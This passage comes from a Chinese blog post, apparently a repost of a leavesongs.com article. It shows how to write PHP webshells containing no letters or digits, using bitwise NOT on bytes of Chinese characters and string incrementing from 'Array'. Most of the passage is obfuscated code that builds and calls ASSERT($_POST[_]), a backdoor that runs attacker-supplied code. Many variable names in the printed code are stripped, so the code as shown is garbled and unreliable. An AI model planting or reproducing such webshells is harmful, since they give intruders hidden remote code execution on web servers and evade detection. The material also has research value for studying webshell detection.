src="https://www.leavesongs.com/media/attachment/2017/02/17/b2ac8554-37f8-448e-bc79-b7213eb2cfb8.6713f3c45766.jpg" alt=""></p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>和方法一有异曲同工之妙，唯一差异就是，方法一使用的是位运算里的“异或”，方法二使用的是位运算里的“取反”。</p><p>方法二利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如<code>&#39;和&#39;&#123;2&#125;</code>的结果是<code>&quot;\x8c&quot;</code>，其取反即为字母<code>s</code>：</p><p><img src="https://www.leavesongs.com/media/attachment/2017/02/17/fadccb70-4143-49df-aa47-bc9a1af93c56.97e405012da5.jpg" alt=""></p><p>利用这个特性，我找了一篇文章（ <a href="https://www.leavesongs.com/THINK/answer.html">https://www.leavesongs.com/THINK/answer.html</a> ），自动选择了其中一些汉字，生成如下答案：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$=(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>)+(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>);</span><br><span class="line"><span class="variable">$_</span>=$/<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$=<span class="string">&quot;瞰&quot;</span>;<span class="variable">$_</span>.=~($&#123;$&#125;);<span class="variable">$__</span>=<span class="string">&quot;和&quot;</span>;<span class="variable">$_</span>.=~($&#123;$&#125;);<span class="variable">$_</span>=<span class="string">&quot;和&quot;</span>;<span class="variable">$_</span>.=~($&#123;$&#125;);<span class="variable">$_</span>=<span class="string">&quot;的&quot;</span>;<span class="variable">$_</span>.=~($&#123;$&#125;);<span class="variable">$__</span>=<span class="string">&quot;半&quot;</span>;<span class="variable">$_</span>.=~($&#123;$&#125;);<span class="variable">$__</span>=<span class="string">&quot;始&quot;</span>;<span class="variable">$_</span>.=~($&#123;<span class="variable">$__</span>&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="string">&#x27;&#x27;</span>;<span class="variable">$__</span>=<span class="string">&quot;俯&quot;</span>;<span class="variable">$_</span>.=~(<span class="variable">$_</span>&#123;$&#125;);$=<span class="string">&quot;瞰&quot;</span>;<span class="variable">$__</span>.=~(<span class="variable">$_</span>&#123;$&#125;);$=<span class="string">&quot;次&quot;</span>;<span class="variable">$__</span>.=~($&#123;$&#125;);<span class="variable">$_</span>=<span class="string">&quot;站&quot;</span>;<span class="variable">$_</span>.=~(<span class="variable">$__</span>&#123;$&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$=<span class="variable">$$__</span>;</span><br><span class="line"><span class="variable">$_</span>($[$]);</span><br></pre></td></tr></table></figure><br><a href="https://www.leavesongs.com/media/attachment/2017/02/17/82b376a7-08a8-4e20-9686-553f400d280d.jpg"><img src="https://www.leavesongs.com/media/attachment/2017/02/17/82b376a7-08a8-4e20-9686-553f400d280d.d8b4b6b1530c.jpg" alt="14871906748025.jpg"></a></p><p>这个答案还利用了PHP的弱类型特性。因为要获取<code>&#39;和&#39;&#123;2&#125;</code>，就必须有数字2。而PHP由于弱类型这个特性，true的值为1，故<code>true+true==2</code>，也就是<code>(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)==2</code>。</p><h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>那么，如果不用位运算这个套路，能不能搞定这题呢？有何不可。</p><p>这就得借助PHP的一个小技巧，先看文档： <a href="http://php.net/manual/zh/language.operators.increment.php">http://php.net/manual/zh/language.operators.increment.php</a></p><p><a href="https://www.leavesongs.com/media/attachment/2017/02/17/a386505b-1c14-48f0-88cb-66923770df33.jpg"><img src="https://www.leavesongs.com/media/attachment/2017/02/17/a386505b-1c14-48f0-88cb-66923770df33.8732f996cd67.jpg" alt="14872693882387.jpg"></a></p><p>也就是说，<code>&#39;a&#39;++ =&gt; &#39;b&#39;</code>，<code>&#39;b&#39;++ =&gt; &#39;c&#39;</code>… 所以，我们只要能拿到一个变量，其值为<code>a</code>，通过自增操作即可获得a-z中所有字符。</p><p>那么，如何拿到一个值为字符串’a’的变量呢？</p><p>巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。</p><p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为<code>Array</code>：</p><p><a href="https://www.leavesongs.com/media/attachment/2017/02/17/4d0c6bc9-5417-41b2-91ca-4e110e8d1350.jpg"><img src="https://www.leavesongs.com/media/attachment/2017/02/17/4d0c6bc9-5417-41b2-91ca-4e110e8d1350.72f524026162.jpg" alt="14872697183159.jpg"></a></p><p>再取这个字符串的第一个字母，就可以获得’A’了。</p><p>利用这个技巧，我编写了如下webshell（因为PHP函数是大小写不敏感的，所以我们最终执行的是<code>ASSERT($_POST[_])</code>，无需获取小写a）：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$=[];</span><br><span class="line">$=@<span class="string">&quot;$&quot;</span>; <span class="comment">// $=&#x27;Array&#x27;;</span></span><br><span class="line">$=$[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; <span class="comment">// $=$[0];</span></span><br><span class="line">$=$; <span class="comment">// A</span></span><br><span class="line">$=$;</span><br><span class="line">$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;</span><br><span class="line"><span class="variable">$__</span>.=$; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$_</span>.=$; <span class="comment">// S</span></span><br><span class="line">$=$;</span><br><span class="line">$++;$++;$++;$++; <span class="comment">// E </span></span><br><span class="line"><span class="variable">$__</span>.=$;</span><br><span class="line">$=$;</span><br><span class="line">$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++; <span class="comment">// R</span></span><br><span class="line">$.=$;</span><br><span class="line">$=$;</span><br><span class="line">$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++; <span class="comment">// T</span></span><br><span class="line">$.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$=$;</span><br><span class="line">$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++; <span class="comment">// P</span></span><br><span class="line"><span class="variable">$__</span>.=$;</span><br><span class="line">$=$;</span><br><span class="line">$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++; <span class="comment">// O</span></span><br><span class="line"><span class="variable">$__</span>.=$;</span><br><span class="line">$=<span class="variable">$_</span>;</span><br><span class="line">$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$__</span>.=$;</span><br><span class="line">$=<span class="variable">$_</span>;</span><br><span class="line">$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$__</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$=<span class="variable">$$__</span>;</span><br><span class="line">$($[]); <span class="comment">// ASSERT($POST[]);</span></span><br></pre></td></tr></table></figure><br>执行结果：</p><p><img src="https://www.leavesongs.com/media/attachment/2017/02/17/d92e3d40-a451-4fc4-a516-e0747b721c69.2b122097850e.jpg" alt=""><br>原文链接：<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 奇淫技巧 </tag>
            
            <tag> webshell </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
